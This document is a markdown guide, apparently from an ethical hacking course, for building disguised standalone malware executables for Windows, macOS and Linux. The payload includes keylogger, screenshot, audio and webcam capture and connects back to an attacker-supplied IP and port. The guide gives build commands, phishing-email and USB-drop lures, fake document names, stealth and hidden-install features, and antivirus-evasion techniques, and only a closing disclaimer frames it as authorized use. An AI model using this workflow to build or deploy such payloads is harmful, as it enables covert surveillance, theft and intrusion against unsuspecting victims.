# Executable Malware Builder Guide

## üéØ Overview

This guide shows you how to create **standalone executable files** (.exe, .app, binary) that:

- ‚úÖ Run automatically when opened (double-click)
- ‚úÖ Don't require Python installation on target
- ‚úÖ Look like normal applications
- ‚úÖ Can have custom icons
- ‚úÖ Work on Windows, macOS, and Linux

---

## üöÄ Quick Start

### 1. Build Windows Executable (.exe)

```bash
cd exploitation
python3 build_executable.py 192.168.1.100 5555 windows
```

**Output**: `payloads/SecurityUpdate.exe` (ready to send!)

### 2. Build macOS Application (.app)

```bash
python3 build_executable.py 192.168.1.100 5555 macos
```

**Output**: `payloads/SystemUpdate.app` (compress to .zip before sending)

### 3. Build Linux Binary

```bash
python3 build_executable.py 192.168.1.100 5555 linux
```

**Output**: `payloads/system-update` (executable binary)

### 4. Build All Platforms

```bash
python3 build_executable.py 192.168.1.100 5555 all
```

**Output**: All three formats in `payloads/` folder

---

## üìã Detailed Instructions

### Step 1: Install PyInstaller

The builder will auto-install PyInstaller **and all required libraries from requirements.txt**, but you can install manually:

```bash
# Install PyInstaller
pip install pyinstaller

# Install required libraries (done automatically by build script)
pip install -r ../requirements.txt
```

**What gets installed automatically:**

- PyInstaller (for building executables)
- pynput (keylogger functionality)
- Pillow (screenshot capture)
- pyautogui (screen automation)
- pyaudio (audio recording)
- opencv-python (webcam capture)

**Note:** The `build_executable.py` script automatically runs `pip install -r requirements.txt` before building, ensuring all dependencies are available.

### Step 2: Prepare Icons (Optional but Recommended)

Create custom icons for better social engineering:

1. **Windows**: Place `windows.ico` in `icons/` folder
2. **macOS**: Place `macos.icns` in `icons/` folder

See `icons/README.md` for icon creation instructions.

### Step 3: Build Executable

```bash
python3 build_executable.py [ATTACKER_IP] [ATTACKER_PORT] [PLATFORM]
```

**Parameters:**

- `ATTACKER_IP`: Your IP address (where server.py runs)
- `ATTACKER_PORT`: Your listening port (default: 5555)
- `PLATFORM`: Target platform (windows/macos/linux/all)

**Examples:**

```bash
# Windows exe with custom IP
python3 build_executable.py 203.0.113.50 4444 windows

# macOS app with default port
python3 build_executable.py 192.168.1.100 5555 macos

# Linux binary
python3 build_executable.py 10.0.0.50 8080 linux

# All platforms at once
python3 build_executable.py 192.168.1.100 5555 all
```

### Step 4: Find Your Executable

After successful build, find files in:

```
exploitation/payloads/
‚îú‚îÄ‚îÄ SecurityUpdate.exe      # Windows
‚îú‚îÄ‚îÄ SystemUpdate.app/       # macOS (folder)
‚îî‚îÄ‚îÄ system-update           # Linux
```

### Step 5: Deploy to Target

See deployment methods below.

---

## üé≠ Deployment Methods

### Windows (.exe)

**Delivery Options:**

1. **Email Attachment**

   ```
   Rename: SecurityUpdate.exe ‚Üí CompanyPolicy.exe
   Subject: "Important: New Company Security Policy"
   Attach and send
   ```

2. **USB Drive**

   ```
   Copy to USB
   Rename to look innocent: HR_Salaries_2025.exe
   Leave in strategic location
   ```

3. **File Sharing**

   ```
   Upload to shared drive
   Name: Q4_Financial_Report.exe
   Wait for download and execution
   ```

4. **Fake Download Site**
   ```html
   <a href="SecurityUpdate.exe" download>Download Security Patch</a>
   ```

**What Happens When Target Opens:**

- Double-click ‚Üí Runs silently ‚Üí No visible window
- Installs dependencies in background
- Connects to your server
- Target sees nothing unusual!

### macOS (.app)

**Delivery Options:**

1. **Compress First** (Important!)

   ```bash
   cd payloads
   zip -r SystemUpdate.zip SystemUpdate.app
   ```

   Then send `SystemUpdate.zip` (macOS will auto-extract when opened)

2. **Email**

   ```
   Subject: "macOS Security Update Required"
   Attach: SystemUpdate.zip
   Body: "Double-click to install security patch"
   ```

3. **Disguise as Document**
   ```bash
   # Rename to look like document viewer
   mv SystemUpdate.app DocumentViewer.app
   zip -r DocumentViewer.zip DocumentViewer.app
   ```

**What Happens:**

- Target extracts .zip ‚Üí Gets .app bundle
- Double-click app ‚Üí Runs without terminal
- Silent execution ‚Üí Connects back
- No visible windows or prompts!

### Linux Binary

**Delivery Options:**

1. **Shell Script Wrapper**

   ```bash
   #!/bin/bash
   # Create innocent-looking installer
   echo "Installing updates..."
   ./system-update &
   echo "Installation complete!"
   ```

   Save as `install.sh` and send with binary

2. **Disguise as System Tool**

   ```bash
   # Rename to look like package manager
   mv system-update apt-updater

   # Or like common tool
   mv system-update network-tool
   ```

3. **Fake Installer Package**
   ```bash
   # Create directory structure
   mkdir installer
   cp system-update installer/
   echo "#!/bin/bash" > installer/install.sh
   echo "./system-update &" >> installer/install.sh
   chmod +x installer/install.sh
   tar -czf installer.tar.gz installer/
   ```

**What Happens:**

- Target runs binary (or script that runs it)
- Executes in background
- Connects to your server
- No terminal output!

---

## üé® Customization Tips

### Rename for Social Engineering

**Windows:**

```
SecurityUpdate.exe ‚Üí CompanyPolicy.exe
SecurityUpdate.exe ‚Üí HR_Documents.exe
SecurityUpdate.exe ‚Üí NetworkScanner.exe
SecurityUpdate.exe ‚Üí PerformanceOptimizer.exe
```

**macOS:**

```
SystemUpdate.app ‚Üí DocumentReader.app
SystemUpdate.app ‚Üí SecurityPatch.app
SystemUpdate.app ‚Üí SystemOptimizer.app
```

**Linux:**

```
system-update ‚Üí apt-get-update
system-update ‚Üí network-scanner
system-update ‚Üí sys-diagnostic
```

### Add Custom Icons

1. Find appropriate icon image (PDF, Word, System icons)
2. Convert to required format (.ico or .icns)
3. Place in `icons/` folder
4. Rebuild executable

See `icons/README.md` for detailed instructions.

### Change Application Name

Edit `build_executable.py`:

```python
# Line ~171 for Windows
output_name = "YourAppName"

# Line ~209 for macOS
output_name = "YourAppName"

# Line ~243 for Linux
output_name = "your-app-name"
```

Then rebuild.

---

## üß™ Testing

### Test in Safe Environment

**Before sending to target, always test!**

1. **Build executable**

   ```bash
   python3 build_executable.py 192.168.1.100 5555 windows
   ```

2. **Start server** (in another terminal)

   ```bash
   cd ..
   python3 server.py
   ```

3. **Test on VM**

   - Copy `SecurityUpdate.exe` to Windows VM
   - Double-click to run
   - Check if connection appears on server

4. **Verify stealth**
   - No visible windows? ‚úÖ
   - No console output? ‚úÖ
   - Connects successfully? ‚úÖ
   - Files hidden in home directory? ‚úÖ

### Platform-Specific Testing

**Windows VM:**

```
1. Copy SecurityUpdate.exe to VM
2. Double-click
3. Check Task Manager (should see Python process)
4. Check for connection on server
```

**macOS VM:**

```
1. Copy SystemUpdate.app to VM
2. Extract if zipped
3. Double-click .app bundle
4. May see "unknown developer" warning (normal)
5. Check Activity Monitor for process
6. Check for connection
```

**Linux VM:**

```
1. Copy system-update to VM
2. Make executable: chmod +x system-update
3. Run: ./system-update
4. Check processes: ps aux | grep python
5. Check for connection
```

---

## üîç File Size Comparison

Typical file sizes after compilation:

| Platform     | File Size | Notes                          |
| ------------ | --------- | ------------------------------ |
| Windows .exe | 8-15 MB   | Single file, no dependencies   |
| macOS .app   | 10-20 MB  | Folder with embedded Python    |
| Linux binary | 8-15 MB   | Single file, statically linked |
| Python .py   | 50-100 KB | Requires Python installed      |

**Why so large?**

- Includes Python interpreter
- Includes all libraries
- Self-contained (no Python needed!)

**Is this suspicious?**

- Not really - many apps are this size
- Can compress for email (reduces to ~5 MB)
- Still smaller than most legit applications

---

## üõ°Ô∏è Stealth Features

### What Makes It Stealthy?

‚úÖ **No Console Window**

- Windows: `--noconsole` flag
- macOS: `--windowed` flag
- Linux: Silent background execution

‚úÖ **Hidden Installation**

- Installs to hidden directory (`.system_update`)
- Uses system-like folder names
- Runs in background

‚úÖ **Silent Dependency Installation**

- Pip installs with `--quiet` flag
- All output redirected to `/dev/null`
- No error messages shown

‚úÖ **Custom Icons**

- Looks like legitimate software
- Can mimic system tools or documents

‚úÖ **Innocent Names**

- SecurityUpdate, SystemUpdate
- Can be renamed to anything

### Anti-Detection

The executable:

- ‚ùå Doesn't modify system files
- ‚ùå Doesn't require admin rights
- ‚ùå Doesn't create registry entries (initially)
- ‚ùå Doesn't show in installed programs
- ‚úÖ Runs as normal user process
- ‚úÖ Uses standard network connections

---

## ‚ö†Ô∏è Antivirus Detection

### Will Antivirus Detect It?

**Likely: YES** - for several reasons:

1. **PyInstaller is known** - AV knows this packer
2. **Behavior-based detection** - Outbound connections
3. **Heuristic analysis** - Suspicious patterns

### Evasion Techniques (Educational)

**Basic:**

```bash
# 1. Obfuscate Python code before building
pip install pyarmor
pyarmor obfuscate temp_payload.py

# 2. Use different packer
# Try: Nuitka, py2exe, cx_Freeze

# 3. Add legitimate code
# Mix malware with real functionality
```

**Advanced:**

```bash
# 1. Code signing (requires certificate)
signtool sign /f cert.pfx /p password SecurityUpdate.exe

# 2. Polymorphic building
# Change code structure each build

# 3. Delayed execution
# Wait 60 seconds before connecting

# 4. Environmental checks
# Only run on specific systems
```

**Testing Detection:**

```bash
# Upload to VirusTotal (CAREFUL - becomes known!)
# Better: Use private sandbox service
# Or: Test on own AV software
```

### Recommendation

For **authorized penetration testing**:

1. Inform client AV may detect
2. Request AV exception for testing
3. Use as demonstration of detection capabilities
4. Focus on user awareness (the weakest link)

For **educational purposes**:

1. Test in isolated VMs only
2. Don't upload to public scanners
3. Learn detection techniques
4. Develop countermeasures

---

## üßπ Cleanup

### On Target Machine

After testing, clean up completely:

```bash
# 1. Find and kill process
ps aux | grep python
kill -9 [PID]

# 2. Remove installation directory
rm -rf ~/.system_update
rm -rf ~/.config/systemd
rm -rf ~/.local/share/system
rm -rf ~/.cache/updates

# 3. Remove executable
rm SecurityUpdate.exe  # Or .app or binary

# 4. Check for persistence
# macOS
ls ~/Library/LaunchAgents/
# Linux
ls ~/.config/autostart/
# Windows
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
```

### On Attacker Machine

```bash
# Clean build artifacts (done automatically)
cd exploitation
rm -rf build/ dist/ *.spec temp_payload.py

# Keep payloads for deployment
ls payloads/
```

---

## üìä Comparison: .py vs .exe

| Feature                | Python .py  | Executable .exe/.app  |
| ---------------------- | ----------- | --------------------- |
| **File Size**          | ~50 KB      | ~10 MB                |
| **Python Required**    | ‚úÖ Yes      | ‚ùå No                 |
| **Double-Click Run**   | ‚ùå No       | ‚úÖ Yes                |
| **Stealth**            | ‚ö†Ô∏è Medium   | ‚úÖ High               |
| **Icon Customization** | ‚ùå No       | ‚úÖ Yes                |
| **Social Engineering** | ‚ö†Ô∏è Harder   | ‚úÖ Easier             |
| **AV Detection**       | ‚ö†Ô∏è Moderate | ‚ö†Ô∏è Moderate-High      |
| **Build Time**         | ‚ö° Instant  | üêå 1-2 minutes        |
| **Cross-Platform**     | ‚úÖ Yes      | ‚ùå Build per platform |

**Verdict:** Use executables for better social engineering success!

---

## üéì Learning Outcomes

After using the executable builder, you should understand:

‚úÖ **Malware Packaging**

- How to create standalone malware
- PyInstaller and code compilation
- Executable formats per platform

‚úÖ **Social Engineering**

- Why executables are more effective
- Importance of naming and icons
- Delivery method selection

‚úÖ **Evasion Techniques**

- Silent execution
- Hidden installation
- Custom icons and naming

‚úÖ **Detection Methods**

- How AV detects packed executables
- Behavioral analysis
- Signature-based detection

‚úÖ **Defense Strategies**

- User awareness training
- Application whitelisting
- Behavioral monitoring

---

## üÜò Troubleshooting

### Build Failed: PyInstaller Not Found

```bash
# Install manually
pip install pyinstaller

# Or let script auto-install
python3 build_executable.py 192.168.1.100 5555 windows
```

### Build Failed: Module Not Found

```bash
# Install missing dependencies
pip install -r ../requirements.txt

# Rebuild
python3 build_executable.py 192.168.1.100 5555 windows
```

### Executable Won't Run on Target

**Windows:**

- Missing Visual C++ Redistributables?
- Try on different Windows version
- Check if 32-bit vs 64-bit

**macOS:**

- "Unknown developer" warning ‚Üí Right-click ‚Üí Open
- Gatekeeper blocking ‚Üí System Preferences ‚Üí Security
- Wrong architecture (Intel vs ARM) ‚Üí Rebuild on target arch

**Linux:**

- Missing libraries? `ldd system-update`
- Not executable? `chmod +x system-update`
- Wrong architecture? Rebuild on similar system

### Executable Too Large

```bash
# Compress before sending
zip SecurityUpdate.zip SecurityUpdate.exe  # Reduces to ~5 MB

# Or use UPX packer
upx --best SecurityUpdate.exe  # Reduces by 50-70%
```

### Connection Not Established

1. Check server is running
2. Verify IP address is correct
3. Check firewall rules
4. Test network connectivity
5. Look for errors in target's output

---

## üìö Additional Resources

**PyInstaller Documentation:**

- https://pyinstaller.org/

**Icon Creation:**

- https://www.icoconverter.com/ (Windows .ico)
- https://cloudconvert.com/png-to-icns (macOS .icns)

**Code Obfuscation:**

- PyArmor: https://pyarmor.readthedocs.io/
- Pyminifier: https://github.com/liftoff/pyminifier

**Alternative Packers:**

- Nuitka: https://nuitka.net/
- cx_Freeze: https://cx-freeze.readthedocs.io/
- py2exe: http://www.py2exe.org/ (Windows only)

---

## ‚öñÔ∏è Legal & Ethical Reminder

**This tool is for AUTHORIZED testing only!**

‚úÖ **Legal Use:**

- Own systems
- Authorized penetration tests
- Educational demonstrations
- Security research

‚ùå **Illegal Use:**

- Unauthorized access
- Malicious distribution
- Data theft
- System damage

**Penalties for misuse:**

- Criminal charges
- Heavy fines
- Imprisonment
- Career destruction

**Always:**

- Get written permission
- Document everything
- Report findings responsibly
- Help improve security

---

**For SIIT DES484 Ethical Hacking Course**  
**Educational Use Only**  
**October 2025**
